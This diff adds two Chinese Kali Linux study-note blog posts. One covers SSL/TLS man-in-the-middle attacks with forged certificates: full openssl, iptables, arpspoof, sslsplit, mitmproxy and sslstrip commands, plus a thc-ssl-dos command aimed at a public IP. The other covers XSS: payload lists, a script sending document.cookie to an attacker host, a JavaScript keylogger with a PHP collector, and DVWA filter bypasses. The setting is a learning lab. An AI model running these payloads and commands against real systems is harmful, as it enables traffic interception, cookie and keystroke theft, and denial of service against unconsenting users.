@@ -240,6 +240,1106 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/01/24/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%BA%94%E5%8D%81%E5%85%AD)%EF%BC%9ASSL%E3%80%81TLS%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB--%E4%BC%AA%E9%80%A0%E8%AF%81%E4%B9%A6/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Tomas">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/photo.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Tomas'Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2020/01/24/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%BA%94%E5%8D%81%E5%85%AD)%EF%BC%9ASSL%E3%80%81TLS%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB--%E4%BC%AA%E9%80%A0%E8%AF%81%E4%B9%A6/" itemprop="url">Kali Linux笔记(五十六)：SSL、TLS中间人攻击--伪造证书</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-01-24T15:08:48+08:00">
+                2020-01-24
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Kali/" itemprop="url" rel="index">
+                    <span itemprop="name">Kali</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <hr>
+<h4 id="1-中间人攻击"><a href="#1-中间人攻击" class="headerlink" title="1. 中间人攻击"></a>1. 中间人攻击</h4><ul>
+<li>攻击者位于客户端和服务器通信链路中<ul>
+<li>ARP（欺骗局域网内所有主机，误认中间人为网关）</li>
+<li>DHCP（若中间人物理连接距离小于DHCP服务器，中间人可开放DHCP服务）</li>
+<li>修改网关（理论上可行，实际上几乎不存在）</li>
+<li>修改DNS（设置DNS解析到中间人的服务上）</li>
+<li>修改HOSTS（本地域名解析文件，优先级高于网卡的DNS服务器）</li>
+<li>ICMP、STP、OSPF（ICMP的重定向、STP生成树协议、OSPF路由协议）</li>
+</ul>
+</li>
+</ul>
+<blockquote>
+<pre><code>⭐STP:生成树协议
+1.多个核心层交换机的多线连接，容易形成环路
+2.多个核心层交换机的冗杂备份
+▲ 交换机物理上的环路，通过生成树协议控制，实现逻辑上的无环路</code></pre></blockquote>
+<p><img src="http://www.wuyidaxue.top:8088/kodex/index.php?user/publicLink&fid=cd17jyxDRF09k8RBXC_RZE6TM74bLDooASryP01CbUNmIirmBN4FVZpWUv9zfFoVS4IJoCSpamScRHoQdctaV3hTYvbBDRvSLdspCZLctOJZx6mVEWxAQe3CXbvevSCX&file_name=/%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB.PNG" alt="中间人攻击"></p>
+<ul>
+<li>加密流量</li>
+<li>攻击的前提<ul>
+<li>客户端已经信任伪造证书颁发机构</li>
+<li>攻击者控制了核发证书颁发机构</li>
+<li>客户端程序禁止了显示证书错误告警信息</li>
+<li>攻击者已经控制客户端，并强制其信任伪造证书</li>
+</ul>
+</li>
+<li>▲ ARP地址欺骗是实现中间人攻击的因素之一</li>
+</ul>
+<h4 id="2-SSLsplit"><a href="#2-SSLsplit" class="headerlink" title="2. SSLsplit"></a>2. SSLsplit</h4><ul>
+<li>SSLsplit（调用Openssl）<ul>
+<li>透明SSL/TLS中间人攻击工具</li>
+<li>对客户端伪装成服务器，对服务器伪装成普通客户端</li>
+<li>伪装服务器需要伪造证书</li>
+<li>支持SSL/TLS加密的SMTP、POP3、FTP等通信中间人攻击</li>
+</ul>
+</li>
+<li>利用openssl生成证书私钥<ul>
+<li><strong><code>🔺命令：openssl genrsa -out ca.key 2048</code></strong></li>
+</ul>
+</li>
+<li>利用私钥签名生成证书<ul>
+<li><strong><code>🔺命令：openssl req -new -x509 -days（证书时间） 1096 -key ca.key -out ca.crt</code></strong></li>
+<li>填写相关信息：Country、Province、Locality Name、Organization、Organizational Name、FQDN Name、Email Address</li>
+</ul>
+</li>
+<li>启用路由（中间人）/proc/sys/net/ipv4/ip_forward<ul>
+<li><strong><code>🔺命令：sysctl -w net.ipv4.ip_forward=1</code></strong></li>
+</ul>
+</li>
+<li>iptables端口转发规则<ul>
+<li><strong><code>🔺命令：iptables -t nat -F</code></strong>（清空当前所有规则）</li>
+<li><strong><code>🔺命令：iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-ports 8080</code></strong> </li>
+<li><strong><code>🔺命令：iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-ports 8443</code></strong></li>
+<li><strong><code>🔺命令：iptables -t nat -A PREROUTING -p tcp --dport 587 -j REDIRECT --to-ports 8443</code></strong> #MSA </li>
+<li><strong><code>🔺命令：iptables -t nat -A PREROUTING -p tcp --dport 465 -j REDIRECT --to-ports 8443</code></strong> #SMTPS </li>
+<li><strong><code>🔺命令：iptables -t nat -A PREROUTING -p tcp --dport 993 -j REDIRECT --to-ports 8443</code></strong> #IMAPS </li>
+<li><strong><code>🔺命令：iptables -t nat -A PREROUTING -p tcp --dport 995 -j REDIRECT --to-ports 8443</code></strong> #POP3S </li>
+<li><strong><code>🔺命令：iptables -t nat -L</code></strong>（查看添加的所有规则）</li>
+</ul>
+</li>
+<li>ARP欺骗<ul>
+<li>win7 → <strong><code>🔺命令：arp a（查看网关MAC地址）</code></strong></li>
+<li>Kali → <strong><code>🔺命令：arpspoof -l eth0 -t 1.1.1.2（目标主机） -r 1.1.1.1（欺骗的网关）</code></strong>▲ 2020.1.23修改-l参数为-i</li>
+</ul>
+</li>
+<li>启动SSLsplit<ul>
+<li><strong><code>🔺命令：mkdir -p test/logdir</code></strong></li>
+<li><strong><code>🔺命令：sslsplit -D（debug模式）-l（连接信息记录） connect.log -j（&quot;越狱目录&quot;） /root/test -S logdir/ -k ca.key -c ca.crt ssl 0.0.0.0 8443 tcp 0.0.0.0 8080</code></strong></li>
+</ul>
+</li>
+<li>被害者访问taobao，baidu，mail.163.com</li>
+<li>查看日志和浏览器证书（connect.log，443.log，80.log）</li>
+<li>安装服务器根证书后再次访问<ul>
+<li>拷贝根证书到win7电脑上</li>
+<li>双击证书安装 → 受信任的根证书颁发机构</li>
+</ul>
+</li>
+</ul>
+<blockquote>
+<pre><code>⭐taobao的官网，除了https加密之外，还对数据进行加密（比如密码控件）
+⭐全站https和非全站https的区别，非全站https是指对登陆的账户和密码使用https登陆
+⭐可以通过grep 12334 * 去查看要查看的信息（搜索日志文件）</code></pre></blockquote>
+<h4 id="3-Mitmproxy"><a href="#3-Mitmproxy" class="headerlink" title="3. Mitmproxy"></a>3. Mitmproxy</h4><ul>
+<li>▲ 同样需要arp地址欺骗来实现SSL中间人攻击</li>
+<li>▲ 自动集成生成一张证书（同SSLsplit的证书不同）</li>
+<li>Bug：http(80)/https(443)只能在8080端口侦听</li>
+<li>iptables端口转发规则<ul>
+<li><strong><code>🔺命令：iptables -t nat -F</code></strong></li>
+<li><strong><code>🔺命令：iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 80 -j REDIRECT --to-port 8080</code></strong></li>
+<li><strong><code>🔺命令：iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 443 -j REDIRECT --to-port 8080</code></strong></li>
+</ul>
+</li>
+<li>启动mitmproxy<ul>
+<li><strong><code>🔺命令：mitmproxy -T --host -w mitmproxy.log</code></strong>（窗口记录流量）</li>
+<li>Tab 下一个信息/q 退出/也可以鼠标点击访问 </li>
+<li>▲ 2020.1.24 -T参数修改为 –mode transparent，-host参数被取消</li>
+</ul>
+</li>
+</ul>
+<h4 id="4-SSLstrip"><a href="#4-SSLstrip" class="headerlink" title="4. SSLstrip"></a>4. SSLstrip</h4><ul>
+<li>▲ 同样需要arp地址欺骗来实现SSL中间人攻击</li>
+<li>与前两种工具不同，将客户端到中间人之间的流量变为明文</li>
+<li>自动生成sslstrip.log文件</li>
+<li><strong><code>🔺命令：sslstrip -l 8080</code></strong> ▲ 2020.1.24若无法转变，则会报建立安全连接失败</li>
+</ul>
+<h4 id="5-SSL-TLS拒绝服务攻击"><a href="#5-SSL-TLS拒绝服务攻击" class="headerlink" title="5. SSL/TLS拒绝服务攻击"></a>5. SSL/TLS拒绝服务攻击</h4><ul>
+<li>thc-ssl-dos<ul>
+<li>SSL协商加密对性能开销增加，大量握手请求会导致拒绝服务</li>
+<li>利用SSL secure Renegotiation特性，在单一TCP连接中生成数千个SSL重连接请求，造成服务器资源过载</li>
+<li>与流量式拒绝服务攻击不同，thc-ssl-dos可以利用ADSL线路打垮30G带宽的服务器</li>
+<li>服务器平均可以处理300次/秒SSL握手请求</li>
+<li>对SMTPS、POP3等服务同样有效</li>
+<li><strong><code>🔺命令：thc-ssl-dos 199.223.209.205 2083 --accept</code></strong> ▲ 2020.1.23 Target has disabled renegotiations.</li>
+</ul>
+</li>
+<li>对策<ul>
+<li>禁用SSL-Renegotiation、使用SSL Accelerator</li>
+<li>通过修改thc-ssl-dos代码，可以绕过以上对策</li>
+</ul>
+</li>
+</ul>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/01/24/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%BA%94%E5%8D%81%E4%BA%8C)%EF%BC%9AXSS/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Tomas">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/photo.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Tomas'Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2020/01/24/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%BA%94%E5%8D%81%E4%BA%8C)%EF%BC%9AXSS/" itemprop="url">Kali Linux笔记(五十二)：XSS</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-01-24T15:08:48+08:00">
+                2020-01-24
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Kali/" itemprop="url" rel="index">
+                    <span itemprop="name">Kali</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <hr>
+<h4 id="1-XSS"><a href="#1-XSS" class="headerlink" title="1. XSS"></a>1. XSS</h4><ul>
+<li>攻击WEB客户端</li>
+<li>客户端脚本语言<ul>
+<li>弹窗告警</li>
+<li>Javascript</li>
+<li>在浏览器中执行</li>
+</ul>
+</li>
+<li>XSS（cross-site scripting）<ul>
+<li>▲ 通过WEB站点漏洞，向客户端交付恶意脚本代码，实现对客户端的攻击目的</li>
+<li>注入客户端脚本代码</li>
+<li>盗取cookie</li>
+<li>重定向</li>
+</ul>
+</li>
+</ul>
+<blockquote>
+<pre><code>⭐之前的攻击手段脚本是对服务端的攻击
+⭐Browser → Web Applicatipn → Server → Database
+⭐服务器WEB站点存在漏洞，Hacker通过客户端提交给WEB站点，攻击WEB客户端</code></pre></blockquote>
+<ul>
+<li>VBScript（针对微软浏览器），ActiveX，or Flash</li>
+<li>JavaScript<ul>
+<li>与Java语言无关</li>
+<li>命名完全出于市场原因</li>
+<li>使用最广的客户端脚本语言</li>
+</ul>
+</li>
+<li>使用场景<ul>
+<li>直接嵌入html：<code>&lt;script&gt;alert(&#39;XSS&#39;);&lt;/script&gt;</code></li>
+<li>元素标签事件：<code>&lt;body onload=&quot;alert(&#39;XSS&#39;)&quot;&gt;</code></li>
+<li>图片标签：<code>&lt;img src=&quot;javascript:alert(&#39;xss&#39;);&quot;&gt;</code></li>
+<li>其他标签：<code>&lt;iframe&gt;,&lt;div&gt;,&lt;link&gt;</code></li>
+<li>DOM对象，篡改页面内容</li>
+</ul>
+</li>
+</ul>
+<blockquote>
+<pre><code>⭐DOM，文本对象模型，每一个页面对应一个DOM对象，每个页面中的元素对应一个DOM对象中的子元素，基于DOM提出了一些API，可以用jS调用DOM的API进行修改元素，不向服务器端发送请求</code></pre></blockquote>
+<ul>
+<li>攻击参与方<ul>
+<li>攻击者</li>
+<li>被攻击者</li>
+<li>漏洞站点</li>
+<li>第三方站点（攻击目标、攻击参与站）</li>
+</ul>
+</li>
+<li>漏洞形成的根源（传入传出无做”消毒”）<ul>
+<li>服务器对用户提交数据过滤不严</li>
+<li>提交给服务器的脚本被直接返回给其他客户端执行</li>
+<li>脚本在客户端执行恶意操作</li>
+</ul>
+</li>
+</ul>
+<blockquote>
+<pre><code>⭐第三方站点存在xss漏洞（比如第三方站点为淘宝）
+1.存放一个js代码
+2.客户端每次访问第三方站点，都会下载这个js代码
+3.js代码指向一个真正攻击站点，若访问的流量过大，会对真正的目标站点形成DDOS攻击</code></pre></blockquote>
+<ul>
+<li>XSS漏洞类型（▲ 客户端发送js代码给服务器，服务器原封不动返回js代码给浏览器）<ul>
+<li>存储型（持久型，一次注入服务器并保存在服务器上）</li>
+<li>反射型（非持久，一次注入服务器，服务器立刻返回给发起方，不保存）</li>
+<li>DOM型（本质是反射型，利用浏览器DOM特性，直接在本地执行修改）</li>
+</ul>
+</li>
+</ul>
+<blockquote>
+<pre><code>⭐反射型漏洞利用
+1.Hacker利用社会工程学调查信息，给受害者发送一封邮件，比如地图等
+2.受害者点击地图，会发送地图中的js代码给有漏洞的服务器，js代码可以为监视器等
+3.服务器端原端不动发送js代码给受害者
+4.js代码到达客户端并在浏览器执行</code></pre></blockquote>
+<ul>
+<li><p>漏洞PoC  ▲▲ 尝试组合</p>
+<ul>
+<li><code>&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;</code></li>
+<li><code>&lt;a href=&#39;&#39; onclick=alert(&#39;xss&#39;)&gt;type&lt;/a&gt;</code>（onclick/onload/onerror）</li>
+<li><code>&lt;img src=http://1.1.1.1/a.jpg onerror=alert(&#39;xss&#39;)&gt;</code></li>
+<li><code>&lt;script&gt;window.location=&quot;http://1.1.1.1&quot;&lt;/script&gt;</code></li>
+<li><code>&lt;iframe SRC=&quot;http://1.1.1.1/victim&quot; height=&quot;0&quot; width=&quot;0&quot;&gt;&lt;/iframe&gt;</code></li>
+<li>▲ 发送Cookies信息：<code>&lt;script&gt;new Image().src=&quot;http://1.1.1.1/c.php?output==&quot;+document.cookie;&lt;/script&gt;</code></li>
+<li>▲ 篡改页面：<code>&lt;script&gt;document.body.innerHTML=&quot;&lt;div style=visibility:visible;&gt;&lt;h1&gt;THIS WEBSITE IS UNDER ATTACK&lt;/h1&gt;&lt;/div&gt;&quot;;&lt;/script&gt;</code></li>
+</ul>
+</li>
+<li><p>窃取Cookie</p>
+<ul>
+<li><strong><code>🔺命令：vi 1.html</code></strong>（body中写入url）</li>
+<li><code>&lt;script src=&quot;http://1.1.1.1/a.js&quot;&gt;&lt;/script&gt;</code></li>
+</ul>
+</li>
+<li><p>a.js源码（隐蔽性强）</p>
+<ul>
+<li>var img = new Image();</li>
+<li>img.src=”<a href="http://1.1.1.1:非80/cookies.php?cookie==&quot;+document.cookie" target="_blank" rel="noopener">http://1.1.1.1:非80/cookies.php?cookie==&quot;+document.cookie</a>;</li>
+</ul>
+</li>
+</ul>
+<blockquote>
+<pre><code>⭐js源码
+1.kali，/var/www/html，vi a.js
+2.var img = new Image();
+3.img.src=&quot;http://1.1.1.1:88/cookies.php?cookie==&quot;+document.cookie;（88端口为nc侦听端口）
+4.service apache2 start
+5.浏览器注入：&lt;script src=&quot;http://1.1.1.1/a.js&quot;&gt;&lt;/script&gt;</code></pre></blockquote>
+<h4 id="2-XSS–键盘记录"><a href="#2-XSS–键盘记录" class="headerlink" title="2. XSS–键盘记录"></a>2. XSS–键盘记录</h4><ul>
+<li>Kali上开启apache服务，<strong><code>🔺命令：service apache2 start</code></strong></li>
+<li>在kali的/var/www/html/中准备Keylogger.js</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">document.onkeypress = function(evt) &#123; </span><br><span class="line">    evt = evt || window.event </span><br><span class="line">    key = String.fromCharCode(evt.charCode) </span><br><span class="line">    if (key) &#123;       </span><br><span class="line">        var http = new XMLHttpRequest(); </span><br><span class="line">        var param = encodeURI(key) http.open(&quot;POST&quot;,&quot;http://192.168.20.8/keylogger.php&quot;,true); http.setRequestHeader(&quot;Content-type&quot;,&quot;application/x-www-form-urlencoded&quot;);</span><br><span class="line">        http.send(&quot;key=&quot;+param); </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>在kali的/var/www/html/中准备Keylogger.php</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">    $key=$_POST[&apos;key&apos;]; </span><br><span class="line">    $logfile=&quot;keylog.txt&quot;; </span><br><span class="line">    $fp = fopen($logfile, &quot;a&quot;); </span><br><span class="line">    fwrite($fp, $key); </span><br><span class="line">    fclose($fp);  </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>在kali的/var/www/html/中准备keylog.txt，不需要写入数据</li>
+<li><strong><code>🔺命令：chmod 777 keylog.txt</code></strong>（保证执行权限）</li>
+<li>浏览器中注入<code>&lt;script src=&quot;http://1.1.1.1/keylogger.js&quot;&gt;&lt;/script&gt;</code></li>
+<li>在浏览器上建立一个a.html <ul>
+<li><code>&lt;a href=&quot;http://192.168.20.10/dvwa/vulnerabilities/xss_r/?name=&lt;script +src=&#39;http://192.168.20.8/keylogger.js&#39;&gt;&lt;/script&gt;&quot;&gt;xss（诱惑性语言）&lt;/a&gt;</code></li>
+</ul>
+</li>
+</ul>
+<h4 id="3-Xsser–基本使用"><a href="#3-Xsser–基本使用" class="headerlink" title="3. Xsser–基本使用"></a>3. Xsser–基本使用</h4><ul>
+<li>命令行/图形化工具</li>
+<li>绕过服务器端输入筛选<ul>
+<li>10进制/16进制编码</li>
+<li>unescape()</li>
+</ul>
+</li>
+<li><strong><code>🔺命令：xsser -u &quot;http://1.1.1.1/dvwa/vulnerabilities/&quot; -g（Get方法）/-p（Post方法） &quot;xss_r/?name=XSS（Get方法/Post为body数据段）&quot; --cookie=&quot;securit=low;PHPSESSID=d23e469411707ff8210717e67c521a81&quot; -s（测试提交后统计）-v（显示详细信息）--reverse-check（防止hash值误报，提交建立网络连接的js脚本，基于连接是否建立）</code></strong> ▲ 2020.1.20在低安全级别下注入不成功</li>
+<li>–heuristi（检查被过滤的字符）</li>
+</ul>
+<h4 id="4-Xsser–payload编码"><a href="#4-Xsser–payload编码" class="headerlink" title="4. Xsser–payload编码"></a>4. Xsser–payload编码</h4><ul>
+<li>对payload编码，绕过服务器端筛选过滤<ul>
+<li>–Str      Use method String.FromCharCode()（字符串编码）</li>
+<li>–Une      Use Unescape() function ▲ 注释</li>
+<li>–Mix      Mix String.FromCharCode() and Unescape()（混合编码）</li>
+<li>–Dec      Use Decimal encoding（十进制编码）</li>
+<li>–Hex      Use Hexadecimal encoding（十六进制编码）</li>
+<li>–Hes      Use Hexadecimal encoding, with semicolons</li>
+<li>–Dwo      Encode vectors IP addresses in DWORD（IP地址编码，双字节）</li>
+<li>–Doo      Encode vectors IP addresses in Octal（IP地址编码，Octal形式）</li>
+<li>–Cem=CEM  Try -manually- different Character Encoding Mutations</li>
+<li>(reverse obfuscation: good) -&gt; (ex: ‘Mix,Une,Str,Hex’)</li>
+</ul>
+</li>
+</ul>
+<h4 id="5-Xsser–注入技术"><a href="#5-Xsser–注入技术" class="headerlink" title="5. Xsser–注入技术"></a>5. Xsser–注入技术</h4><ul>
+<li>注入技术（多选）<ul>
+<li>–Coo      Cross Site Scripting Cookie injection（Cookie注入）</li>
+<li>–Xsa      Cross Site Agent Scripting（Agent注入）</li>
+<li>–Xsr      Cross Site Referer Scripting（Referer注入）</li>
+<li>–Dcp      Data Control Protocol injections（数据控制协议注入）</li>
+<li>–Dom      Document Object Model injections（DOM对象注入）</li>
+<li>–Lnd      HTTP Response Splitting Induced code（HTTP响应代码）</li>
+<li>–Anchor   Use Anchor Stealth payloader (DOM shadows!)</li>
+<li>–Phpids   PHP - Exploit PHPIDS bug (0.6.5) to bypass filters（phpids是基于PHP的一个安全框架，存在Bug）</li>
+<li>–Doss     XSS Denial of service (server) injection（服务器拒绝服务）</li>
+<li>–Dos      XSS Denial of service (client) injection（客户端拒绝服务）</li>
+<li>–B64      Base64 code encoding in META tag (rfc2397)（Base64编码）</li>
+<li>–Onm      ONM - Use onMouseMove() event to inject code（页面事件注入）</li>
+<li>–Ifr      Use <code>&lt;iframe&gt;</code>source tag to inject code（iframe注入）</li>
+</ul>
+</li>
+</ul>
+<h4 id="6-XSS–DVWA"><a href="#6-XSS–DVWA" class="headerlink" title="6. XSS–DVWA"></a>6. XSS–DVWA</h4><ul>
+<li>Dvwa的XSS reflected（Low）</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    </span><br><span class="line">    if(!array_key_exists (&quot;name&quot;, $_GET) || $_GET[&apos;name&apos;] == NULL || $_GET[&apos;name&apos;] == &apos;&apos;)&#123;</span><br><span class="line"></span><br><span class="line">    $isempty = true;</span><br><span class="line"></span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        </span><br><span class="line">    echo &apos;&lt;pre&gt;&apos;;</span><br><span class="line">    echo &apos;Hello &apos; . $_GET[&apos;name&apos;];</span><br><span class="line">    echo &apos;&lt;/pre&gt;&apos;;</span><br><span class="line">    </span><br><span class="line">    &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>Dvwa的XSS reflected（Medium）–对输出的过滤<ul>
+<li>绕过方法：<code>&lt;scri&lt;script&gt;pt&gt;alert(&#39;xss&#39;);&lt;/scri&lt;script&gt;pt&gt;</code></li>
+</ul>
+</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">    if(!array_key_exists (&quot;name&quot;, $_GET) || $_GET[&apos;name&apos;] == NULL || $_GET[&apos;name&apos;] == &apos;&apos;)&#123;</span><br><span class="line"></span><br><span class="line">    $isempty = true;</span><br><span class="line"></span><br><span class="line">    &#125; else &#123;</span><br><span class="line"></span><br><span class="line">    echo &apos;&lt;pre&gt;&apos;;</span><br><span class="line">    echo &apos;Hello &apos; . str_replace(&apos;&lt;script&gt;&apos;, &apos;&apos;, $_GET[&apos;name&apos;]);</span><br><span class="line">    echo &apos;&lt;/pre&gt;&apos;; </span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>Dvwa的XSS reflected（High）–对输出的过滤<ul>
+<li>▲ htmlspecialchars() → 输出html编码&lt; → &lt; &gt; → &gt;</li>
+<li>绕过尝试: <strong><code>🔺命令：xsser -u &quot;http://1.1.1.1/dvwa/vulnerabilities/&quot; -g &quot;xss_r/?name=&quot; --cookie=&quot;security=high; PHPSESSID=d23e469411707ff8210717e67c521a81&quot; -Cem=&#39;Mix,Une,Str,Hex&#39;</code></strong></li>
+<li>▲ 若注入代码位于&lt;&gt;之内，可以不输入&lt;&gt;，直接输入代码，如Onclick=alert(‘xss’)</li>
+</ul>
+</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    </span><br><span class="line">    if(!array_key_exists (&quot;name&quot;, $_GET) || $_GET[&apos;name&apos;] == NULL || $_GET[&apos;name&apos;] == &apos;&apos;)&#123;</span><br><span class="line">    </span><br><span class="line">    $isempty = true;</span><br><span class="line">        </span><br><span class="line">    &#125; else &#123;</span><br><span class="line">    </span><br><span class="line">    echo &apos;&lt;pre&gt;&apos;;</span><br><span class="line">    echo &apos;Hello &apos; . htmlspecialchars($_GET[&apos;name&apos;]);</span><br><span class="line">    echo &apos;&lt;/pre&gt;&apos;;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<h4 id="7-XSS-stored"><a href="#7-XSS-stored" class="headerlink" title="7. XSS stored"></a>7. XSS stored</h4><ul>
+<li>存储型XSS<ul>
+<li>长期存储于服务器端</li>
+<li>每次用户访问都会被执行javascript脚本</li>
+</ul>
+</li>
+<li>Name：客户端表单长度限制（好的Web Application同时在客户端和服务器端做长度限制）<ul>
+<li>解除限制：浏览器客户端、截断代理</li>
+</ul>
+</li>
+<li><code>&lt;script src=&quot;http://1.1.1.1/a.js&quot;&gt;&lt;/script&gt;</code></li>
+<li>a.js源码（隐蔽性强）<ul>
+<li>var img = new Image();</li>
+<li>img src=”<a href="http://1.1.1.1/cookies.php?cookie=&quot;+document.cookie" target="_blank" rel="noopener">http://1.1.1.1/cookies.php?cookie=&quot;+document.cookie</a>;</li>
+</ul>
+</li>
+</ul>
+<blockquote>
+<pre><code>⭐js源码
+1.kali，/var/www/html，vi a.js
+2.var img = new Image();
+3.img src=&quot;http://1.1.1.1:88/cookies.php?cookie=&quot;+document.cookie;（88端口为nc侦听端口）
+4.service apache2 start
+5.浏览器注入：&lt;script src=&quot;http://1.1.1.1/a.js&quot;&gt;&lt;/script&gt;</code></pre></blockquote>
+<h4 id="8-XSS-stored–DVWA（▲-换不同安全级别的时候，需要清除数据库）"><a href="#8-XSS-stored–DVWA（▲-换不同安全级别的时候，需要清除数据库）" class="headerlink" title="8. XSS stored–DVWA（▲ 换不同安全级别的时候，需要清除数据库）"></a>8. XSS stored–DVWA（▲ 换不同安全级别的时候，需要清除数据库）</h4><ul>
+<li>DVWA的XSS stored（&amp;message、Low）<ul>
+<li>基本没有对&amp;message、&amp;name过滤，可实现任意注入</li>
+</ul>
+</li>
+</ul>
